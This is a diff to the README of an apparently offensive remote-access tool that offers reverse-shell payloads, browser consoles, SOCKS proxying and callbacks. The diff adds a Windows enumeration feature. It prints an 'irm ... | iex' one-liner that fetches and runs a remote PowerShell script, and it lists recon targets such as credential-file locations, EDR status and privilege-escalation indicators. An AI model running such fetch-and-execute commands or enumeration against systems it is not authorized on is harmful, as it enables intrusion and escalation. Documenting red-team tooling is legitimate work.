@@ -23,6 +23,7 @@ drop web UI), and built-in reverse-shell payloads.
 - **Browser consoles** — full interactive PTY / ConPTY sessions, Windows/macOS/Linux connection commands, terminal resizing, Ctrl+C, and disconnect controls (automatic with `expose-online`)
 - **Network proxy** — `expose-online` also starts a local SOCKS5 listener; route `proxychains`, `curl`, or other tools through the connected machine's network. Forward proxying only — no reverse shell.
 - **Inbound callbacks** — expose a listener on the connected machine and forward it to a local service, so targets on the endpoint's network can connect back to you.
+- **Windows enumeration** — a read-only `winenum` script and command library for low-privilege host/domain checks and candidate escalation paths, with report upload.
 - **Password-protected session** — `expose-online` gates the UI and API behind a login and session cookie; connector tickets and agent tokens remain self-authenticating.
 - **Resilient reconnection** — the connector and tunnel retry across multi-hour outages; sessions stay attached and the console resumes when the network returns.
 - **Focused operator log** — hides UI polling, deduplicates external hits, and shows login, connector, SOCKS, callback, tunnel, and real client IP events.
@@ -104,6 +105,7 @@ content on `/content`, or 404):
 | `GET /` · `GET /upload` | Upload web UI (drag & drop, queue, received-files list, log panel, chat) |
 | `GET /login` · `POST /login` · `POST /logout` | Password gate and session cookie |
 | `POST /upload` | Multipart upload — saves to `~/Downloads/expose` |
+| `POST /upload?ticket=…` | Ticket-authenticated upload for endpoint reports |
 | `GET /upload/files` | JSON list of received files |
 | `GET /upload/files/<name>` | Download a received file |
 | `DELETE /upload/files/<name>` | Delete a received file |
@@ -115,6 +117,7 @@ content on `/content`, or 404):
 | `POST /chat/upload` | Send multipart files with an optional `message` field |
 | `GET /upload/preview/<name>` | Safe inline media / text preview |
 | `GET /lin`, `/mac`, `/win` | Console connector bootstrap (requires a connection ticket) |
+| `POST /console/winenum/ticket` · `GET /console/winenum.ps1?ticket=…` | Windows enumeration script and its short-lived transfer ticket |
 | `/console/*` | Console status, browser control, proxy, callbacks, and connector relay |
 | `GET`/`POST /chat` | Mini chat shared between visitors of the upload page |
 
@@ -230,6 +233,43 @@ Ports below 1024 require root or `CAP_NET_BIND_SERVICE` on Linux/macOS. On
 Windows, port 445 is owned by the SMB service (`System`) and cannot be bound by
 the connector while SMB is running. Use a high remote port when you control the
 client, for example `--callback 445:8445` (endpoint:8445 → local:445).
+
+## Windows enumeration
+
+**Consoles → Windows enumeration** provides a copy/run library of read-only
+checks and a `winenum` script for a selected Windows console. It runs as the
+current user; nothing is installed and no configuration is changed.
+
+```powershell
+# what the Run winenum button sends
+$ExposeTicket='…'; $ExposeOrigin='https://singlecore.dev'
+irm "$ExposeOrigin/console/winenum.ps1?ticket=$ExposeTicket" | iex
+```
+
+The script collects:
+
+- Identity, groups, integrity level, and dangerous token privileges
+- Host, domain, patch level, Defender/EDR status, processes, and sessions
+- Network configuration, listeners, routes, SMB mappings, proxy settings
+- Local and domain users/groups, domain controllers, trusts, GPO summary
+- Services, unquoted paths, writeable service files/directories, raw service ACLs
+- Scheduled tasks, autoruns, startup folders, installed software, shares
+- Presence of credential material (paths only): `cmdkey`, `klist`, DPAPI files,
+  SSH keys, PowerShell history, unattend/sysprep files
+- Escalation indicators: `AlwaysInstallElevated`, autologon password presence,
+  writeable `PATH` directories, UAC settings, AppLocker policy
+- A final **Candidate escalation paths** summary
+
+The report is written to `%TEMP%\expose-winenum-<host>-<time>.txt` and uploaded
+through a short-lived ticket to `~/Downloads/expose` on this host. The script
+ticket is issued only to an authenticated operator session; the ticket only
+grants the script download and report upload, and expires after 30 minutes.
+
+This is **read-only path identification**, not exploitation. It does not dump
+credentials or modify services, tasks, or ACLs. Validate candidates manually.
+For domain attack paths use **BloodHound/SharpHound**, **Certipy** (AD CS), and
+**Grouper2/GPOHound**; for network context use **NetExec**. Public tools are
+heavily signatured by Defender/EDR, so use this only on authorized systems.
 
 ## Password protection
 
